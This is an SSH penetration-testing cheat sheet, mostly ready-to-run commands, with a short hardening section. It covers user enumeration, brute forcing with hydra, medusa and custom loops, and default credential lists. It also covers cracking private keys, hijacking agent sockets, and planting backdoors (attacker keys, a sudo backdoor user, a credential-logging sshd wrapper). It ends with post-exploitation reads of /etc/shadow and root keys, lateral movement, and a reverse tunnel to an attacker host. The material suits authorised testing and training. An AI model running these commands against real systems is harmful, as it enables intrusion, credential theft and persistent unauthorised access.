# SSH ENUMERATION (Port 22)

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p22 <IP>                              # Service/Version detection
nc -nv <IP> 22                                  # Manual banner grab
telnet <IP> 22                                  # Alternative banner grab
ssh -v <IP>                                     # Verbose SSH connection attempt
ssh <IP> -o PreferredAuthentications=none       # Force banner display
echo "SSH-2.0-Test" | nc <IP> 22                # Send client banner, get server banner
```

## SSH ALGORITHM & CIPHER ENUMERATION
```bash
nmap --script=ssh2-enum-algos -p22 <IP>         # Enumerate all algorithms
ssh -vv <IP>                                    # Verbose output shows algos
ssh -Q cipher                                   # List supported ciphers (local)
ssh -Q mac                                      # List MAC algorithms (local)
ssh -Q kex                                      # List key exchange algorithms (local)
ssh -Q key                                      # List key types (local)
```

## HOST KEY ENUMERATION
```bash
nmap --script=ssh-hostkey -p22 <IP>             # Get host keys + fingerprints
ssh-keyscan -t rsa,dsa,ecdsa,ed25519 <IP>       # Scan for all key types
ssh-keyscan <IP>                                # Quick host key grab
ssh-keygen -l -f <known_hosts_entry>            # Get fingerprint from known_hosts
ssh-keygen -F <IP>                              # Find host in known_hosts
```

## AUTHENTICATION METHODS TESTING
```bash
nmap --script=ssh-auth-methods -p22 <IP>        # Enumerate auth methods
nmap --script=ssh-auth-methods --script-args="ssh.user=root" -p22 <IP>  # For specific user
ssh -v -o PreferredAuthentications=none <IP>    # Check allowed auth methods
ssh -o PreferredAuthentications=password <IP>   # Try password auth only
ssh -o PreferredAuthentications=publickey <IP>  # Try pubkey auth only
ssh -o PreferredAuthentications=keyboard-interactive <IP>  # Try keyboard-interactive
```

## USER ENUMERATION
```bash
# OpenSSH < 7.7 - CVE-2018-15473 (User Enumeration)
python3 ssh-user-enum.py --port 22 --userList users.txt <IP>
nmap --script=ssh-auth-methods --script-args="ssh.user=admin" -p22 <IP>
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS <IP>; run"

# Timing-based user enumeration
for user in $(cat users.txt); do ssh -o PreferredAuthentications=none $user@<IP> 2>&1 | grep -i "permission\|auth"; done

# Common usernames to test
root, admin, administrator, user, guest, test, ubuntu, ec2-user, centos, debian, oracle, pi
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l root -P rockyou.txt ssh://<IP>         # Single user
hydra -L users.txt -P passwords.txt ssh://<IP>  # User/pass lists
hydra -l root -P passwords.txt -t 4 ssh://<IP>  # Limit threads (avoid detection)
hydra -C user_pass.txt ssh://<IP>               # Colon-separated format (user:pass)

# Medusa
medusa -h <IP> -u root -P passwords.txt -M ssh  # Single user
medusa -h <IP> -U users.txt -P passwords.txt -M ssh  # User/pass lists
medusa -h <IP> -u root -P passwords.txt -M ssh -t 4  # Limit threads

# Nmap
nmap --script=ssh-brute -p22 <IP>               # Default wordlist
nmap --script=ssh-brute --script-args userdb=users.txt,passdb=pass.txt -p22 <IP>

# Metasploit
msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS <IP>; set USERNAME root; set PASS_FILE /usr/share/wordlists/rockyou.txt; run"

# Patator
patator ssh_login host=<IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'

# CrackMapExec
crackmapexec ssh <IP> -u users.txt -p passwords.txt --continue-on-success

# Custom script for slow brute
for pass in $(cat passwords.txt); do sshpass -p "$pass" ssh -o StrictHostKeyChecking=no root@<IP> "echo SUCCESS" && echo "[+] Password: $pass" && break; sleep 1; done
```

## DEFAULT CREDENTIALS TESTING
```bash
# Common default credentials
root:root, root:toor, root:password, root:admin
admin:admin, admin:password, admin:12345
user:user, test:test, guest:guest
pi:raspberry (Raspberry Pi)
ubuntu:ubuntu, debian:debian, centos:centos

# Automated testing
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://<IP>
```

## SSH KEY AUTHENTICATION TESTING
```bash
# Test with found private key
chmod 600 id_rsa                                # Fix permissions
ssh -i id_rsa user@<IP>                         # Connect with private key
ssh -i id_rsa -v user@<IP>                      # Verbose output

# Test publickey acceptance
nmap --script=ssh-publickey-acceptance --script-args="ssh.user=root,ssh.publickey=id_rsa.pub" -p22 <IP>

# Generate SSH key pair
ssh-keygen -t rsa -b 4096 -f mykey              # RSA key
ssh-keygen -t ed25519 -f mykey                  # Ed25519 key (modern)
ssh-keygen -t ecdsa -b 521 -f mykey             # ECDSA key

# Add public key to authorized_keys (if write access to target)
cat id_rsa.pub >> ~/.ssh/authorized_keys        # On target system
```

## PRIVATE KEY CRACKING
```bash
# Crack encrypted SSH private key
ssh2john id_rsa > id_rsa.hash                   # Convert to john format
john --wordlist=rockyou.txt id_rsa.hash         # Crack with john
john --show id_rsa.hash                         # Show cracked password

# Decrypt private key after cracking
openssl rsa -in id_rsa -out id_rsa_decrypted    # Remove passphrase
chmod 600 id_rsa_decrypted                      # Fix permissions
```

## WEAK ALGORITHM DETECTION
```bash
# Check for weak/deprecated algorithms
nmap --script=ssh2-enum-algos -p22 <IP> | grep -E "arcfour|cbc|md5|sha1|diffie-hellman-group1"

# Test connection with weak ciphers
ssh -c aes128-cbc <IP>                          # CBC mode (vulnerable to attacks)
ssh -m hmac-md5 <IP>                            # MD5 MAC (weak)
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 <IP>  # Weak KEX

# Force specific algorithms
ssh -c aes256-ctr -m hmac-sha2-256 <IP>         # Strong cipher + MAC
```

## SSH AUDIT TOOLS
```bash
# ssh-audit (comprehensive security audit)
ssh-audit <IP>                                  # Full audit report
ssh-audit -p 2222 <IP>                          # Custom port
ssh-audit -l warn <IP>                          # Only show warnings/errors
ssh-audit -nv <IP>                              # No color, verbose

# Manual audit checklist
grep -E "PermitRootLogin|PasswordAuthentication|PubkeyAuthentication|PermitEmptyPasswords" /etc/ssh/sshd_config
```

## VULNERABILITY SCANNING
```bash
# Search for exploits
searchsploit openssh                            # Search all OpenSSH exploits
searchsploit openssh 7.4                        # Search specific version
nmap --script=vuln -p22 <IP>                    # Vuln scan (generic)

# Known vulnerabilities to check
# CVE-2018-15473: User enumeration (OpenSSH < 7.7)
# CVE-2016-20012: MaxAuthTries bypass
# CVE-2015-5600: MaxAuthTries bypass + user enum
# CVE-2008-5161: CBC plaintext disclosure
# CVE-2006-5051: Signal handler race condition
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version           # Version detection
use auxiliary/scanner/ssh/ssh_login             # Login scanner
use auxiliary/scanner/ssh/ssh_login_pubkey      # Pubkey login scanner
use auxiliary/scanner/ssh/ssh_enumusers         # User enumeration (CVE-2018-15473)
use auxiliary/scanner/ssh/ssh_identify_pubkeys  # Identify accepted pubkeys
use post/linux/gather/hashdump                  # Post-exploitation hash dump
use post/multi/gather/ssh_creds                 # Gather SSH credentials
```

## PORT FORWARDING & TUNNELING
```bash
# Local port forwarding (access remote service through SSH)
ssh -L 8080:localhost:80 user@<IP>              # Forward local 8080 to remote 80
ssh -L 3306:db.internal:3306 user@<IP>          # Access internal database

# Remote port forwarding (expose local service to remote)
ssh -R 8080:localhost:80 user@<IP>              # Remote can access your local port 80

# Dynamic port forwarding (SOCKS proxy)
ssh -D 1080 user@<IP>                           # Create SOCKS proxy on port 1080
proxychains -f /etc/proxychains.conf nmap <target>  # Use SSH tunnel for scanning

# Tunnel all traffic through SSH
ssh -w 0:0 user@<IP>                            # VPN-like tunnel (requires root)
```

## SSH ESCAPE SEQUENCES
```bash
# Useful escape sequences (press Enter, then ~)
~.                                              # Disconnect
~^Z                                             # Suspend SSH
~#                                              # List forwarded connections
~C                                              # Open command line (add/remove port forwards)
~?                                              # Help (show all escapes)
```

## SSH CLIENT OPTIONS & TECHNIQUES
```bash
# Useful connection options
ssh -v user@<IP>                                # Verbose (debug level 1)
ssh -vv user@<IP>                               # More verbose (debug level 2)
ssh -vvv user@<IP>                              # Maximum verbosity (debug level 3)
ssh -4 user@<IP>                                # Force IPv4
ssh -6 user@<IP>                                # Force IPv6
ssh -p 2222 user@<IP>                           # Custom port
ssh -o ConnectTimeout=10 user@<IP>              # Connection timeout
ssh -o StrictHostKeyChecking=no user@<IP>       # Ignore host key verification
ssh -o UserKnownHostsFile=/dev/null user@<IP>   # Don't save to known_hosts
ssh -o PubkeyAuthentication=no user@<IP>        # Disable pubkey auth
ssh -o PasswordAuthentication=no user@<IP>      # Disable password auth
ssh -N -f user@<IP>                             # Background, no command execution
ssh -T user@<IP>                                # No pseudo-terminal allocation
ssh -X user@<IP>                                # Enable X11 forwarding
ssh -A user@<IP>                                # Enable agent forwarding

# Combined stealth options
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T user@<IP>
```

## REMOTE COMMAND EXECUTION
```bash
# Execute commands without interactive session
ssh user@<IP> "whoami"                          # Single command
ssh user@<IP> "cat /etc/passwd"                 # Read file
ssh user@<IP> "id; uname -a; cat /etc/issue"    # Multiple commands

# Nmap SSH command execution
nmap --script=ssh-run --script-args="ssh-run.cmd='cat /etc/passwd', ssh-run.username=user, ssh-run.password=pass" -p22 <IP>

# Background process
ssh user@<IP> "nohup /tmp/backdoor &"           # Run in background
```

## SSH AGENT FORWARDING EXPLOITATION
```bash
# Enable agent forwarding (risky if server compromised)
ssh -A user@<IP>                                # Enable agent forwarding

# Hijack SSH agent socket (on compromised server)
ls -la /tmp/ssh-*/agent.*                       # Find agent sockets
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.YYYY   # Hijack socket
ssh-add -l                                      # List keys in hijacked agent
ssh user@<other_target>                         # Use forwarded keys

# Protection against agent hijacking
ssh -a user@<IP>                                # Disable agent forwarding
# Or in ~/.ssh/config: ForwardAgent no
```

## INTERESTING FILES & LOCATIONS
```bash
# SSH configuration files
/etc/ssh/sshd_config                            # SSH daemon config
/etc/ssh/ssh_config                             # SSH client config (system-wide)
~/.ssh/config                                   # SSH client config (user)
~/.ssh/known_hosts                              # Known host keys
~/.ssh/authorized_keys                          # Authorized public keys
~/.ssh/id_rsa                                   # Private RSA key
~/.ssh/id_rsa.pub                               # Public RSA key
~/.ssh/id_ed25519                               # Private Ed25519 key
~/.ssh/id_ecdsa                                 # Private ECDSA key

# Interesting files for privilege escalation
/etc/ssh/ssh_host_*_key                         # Host private keys (readable = privesc)
/root/.ssh/id_rsa                               # Root's private key
/home/*/.ssh/id_rsa                             # User private keys
/var/log/auth.log                               # Authentication logs (successful logins)
/var/log/secure                                 # SSH logs (Red Hat/CentOS)
~/.bash_history                                 # May contain SSH commands with passwords

# SSH keys in unexpected places
find / -name "id_rsa" 2>/dev/null               # Find all RSA keys
find / -name "*.pem" 2>/dev/null                # Find PEM keys
grep -r "BEGIN.*PRIVATE KEY" /home/ 2>/dev/null # Search for private keys
grep -r "BEGIN.*PRIVATE KEY" /var/www/ 2>/dev/null  # Web directories
```

## SSH CONFIG FILE ANALYSIS
```bash
# Check for dangerous settings
grep -E "PermitRootLogin yes" /etc/ssh/sshd_config              # Root login allowed
grep -E "PasswordAuthentication yes" /etc/ssh/sshd_config       # Password auth enabled
grep -E "PermitEmptyPasswords yes" /etc/ssh/sshd_config         # Empty passwords allowed
grep -E "PubkeyAuthentication no" /etc/ssh/sshd_config          # Pubkey auth disabled
grep -E "ChallengeResponseAuthentication yes" /etc/ssh/sshd_config  # Challenge auth
grep -E "X11Forwarding yes" /etc/ssh/sshd_config                # X11 forwarding (risky)
grep -E "PermitUserEnvironment yes" /etc/ssh/sshd_config        # User env vars (privesc)
grep -E "AllowTcpForwarding yes" /etc/ssh/sshd_config           # TCP forwarding allowed
grep -E "AllowUsers" /etc/ssh/sshd_config                       # User whitelist
grep -E "DenyUsers" /etc/ssh/sshd_config                        # User blacklist
```

## SSH BACKDOORS & PERSISTENCE
```bash
# Add SSH key for persistence (requires write access)
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Modify sshd_config for backdoor
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd

# Create backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password" | chpasswd
usermod -aG sudo backdoor

# SSH wrapper backdoor (advanced)
mv /usr/sbin/sshd /usr/sbin/sshd.real
# Create wrapper script that logs credentials and calls real sshd
```

## JUMP HOSTS & PROXYING
```bash
# ProxyJump (OpenSSH 7.3+)
ssh -J jumphost@<jumpIP> user@<targetIP>        # Single jump
ssh -J jump1@<IP1>,jump2@<IP2> user@<targetIP>  # Multiple jumps

# ProxyCommand (older method)
ssh -o ProxyCommand="ssh -W %h:%p jumphost@<jumpIP>" user@<targetIP>

# SSH config for jump host
cat >> ~/.ssh/config <<EOF
Host target
    HostName <targetIP>
    User user
    ProxyJump jumphost@<jumpIP>
EOF
ssh target                                      # Connect using config
```

## MAN-IN-THE-MIDDLE DETECTION
```bash
# Check for MITM warnings
ssh user@<IP>                                   # Look for "WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!"

# Verify host key fingerprint
ssh-keygen -l -f /etc/ssh/ssh_host_ecdsa_key.pub  # On server
ssh-keyscan <IP> | ssh-keygen -lf -             # From client

# Remove old host key (after MITM warning)
ssh-keygen -R <IP>                              # Remove from known_hosts
ssh-keygen -R <IP> -f ~/.ssh/known_hosts        # Specify file
```

## TIMING-BASED ATTACKS
```bash
# Username enumeration via timing
time ssh invalid_user@<IP>                      # Time response
time ssh valid_user@<IP>                        # Compare timing

# Automated timing-based enum
for user in $(cat users.txt); do
    TIME=$(time ssh -o ConnectTimeout=1 $user@<IP> 2>&1 | grep real)
    echo "$user: $TIME"
done
```

## POST-EXPLOITATION (AFTER SSH ACCESS)
```bash
# Information gathering
whoami && id && hostname                        # Basic info
uname -a                                        # Kernel version
cat /etc/issue                                  # OS version
cat /etc/*-release                              # Distribution info
ps aux                                          # Running processes
netstat -tulpn                                  # Network connections
ss -tulpn                                       # Alternative to netstat
cat /etc/passwd                                 # User accounts
cat /etc/shadow                                 # Password hashes (if readable)
sudo -l                                         # Sudo permissions
find / -perm -4000 2>/dev/null                  # SUID binaries
cat /root/.ssh/id_rsa                           # Root's private key (if readable)
history                                         # Command history

# Persistence
cp ~/.ssh/authorized_keys ~/.ssh/authorized_keys.bak
echo "ssh-rsa AAAA... attacker@kali" >> ~/.ssh/authorized_keys

# Lateral movement
cat ~/.ssh/known_hosts                          # Other SSH targets
cat ~/.bash_history | grep ssh                  # SSH commands in history
for key in $(find ~ -name "id_rsa" 2>/dev/null); do ssh -i $key user@<next_target>; done
```

## COMMON MISCONFIGURATIONS
```
☐ PermitRootLogin yes                           # Root can login directly
☐ PasswordAuthentication yes                    # Brute force possible
☐ PermitEmptyPasswords yes                      # Empty passwords allowed
☐ PubkeyAuthentication no                       # Only password auth (weaker)
☐ X11Forwarding yes                             # X11 MITM attacks possible
☐ PermitUserEnvironment yes                     # Privilege escalation vector
☐ Weak ciphers enabled (CBC, arcfour)           # Cryptographic attacks
☐ Default port 22                               # Easily scanned/targeted
☐ No fail2ban/rate limiting                     # Brute force not mitigated
☐ Outdated OpenSSH version                      # Known vulnerabilities
```

## SSH HARDENING CHECKS
```bash
# Check current security posture
ssh-audit <IP>                                  # Automated audit
grep "^[^#]" /etc/ssh/sshd_config               # Review active config

# Recommended settings
Protocol 2                                      # SSH protocol 2 only
PermitRootLogin no                              # Disable root login
PasswordAuthentication no                       # Disable passwords (use keys)
PubkeyAuthentication yes                        # Enable public key auth
PermitEmptyPasswords no                         # No empty passwords
X11Forwarding no                                # Disable X11 forwarding
AllowUsers <specific_users>                     # Whitelist users
MaxAuthTries 3                                  # Limit auth attempts
ClientAliveInterval 300                         # Timeout idle sessions
ClientAliveCountMax 2                           # Max client alive messages
```

## QUICK WIN CHECKLIST
```
☐ Banner grab for version detection
☐ Check for known vulnerabilities (searchsploit)
☐ Test default credentials (root:root, admin:admin, etc.)
☐ Test anonymous/guest access
☐ User enumeration (CVE-2018-15473 if OpenSSH < 7.7)
☐ Check for weak algorithms/ciphers
☐ Brute force with common passwords
☐ Search for SSH private keys in web directories
☐ Check authorized_keys if file read access
☐ Test found private keys
☐ Crack encrypted private keys
☐ Check for PermitRootLogin in config
☐ Test SSH key authentication bypass
☐ Look for SSH backdoors (vsftpd smiley-style)
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive SSH scan
nmap -sV -p22 --script "ssh-* and not ssh-brute" -oA ssh_enum <IP>

# Quick vulnerability + user enum
nmap --script=ssh-auth-methods,ssh2-enum-algos,ssh-hostkey,ssh-publickey-acceptance --script-args ssh.user=root -p22 <IP>

# Fast default credential check
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://<IP> -t 4
```

## ADVANCED TECHNIQUES
```bash
# SSH through HTTP proxy
ssh -o "ProxyCommand=nc -X connect -x proxy:8080 %h %p" user@<IP>

# SSH with specific key algorithm
ssh -o HostKeyAlgorithms=ssh-rsa user@<IP>      # Force RSA

# SSH with keepalive
ssh -o ServerAliveInterval=60 user@<IP>         # Send keepalive every 60s

# SSH with compression
ssh -C user@<IP>                                # Enable compression

# SSH multiplexing (reuse connections)
ssh -M -S /tmp/ssh-socket user@<IP>             # Master connection
ssh -S /tmp/ssh-socket user@<IP>                # Reuse connection

# Reverse SSH tunnel (from target to attacker)
ssh -R 2222:localhost:22 attacker@<attacker_IP> # Target runs this
ssh -p 2222 user@localhost                      # Attacker connects back
```
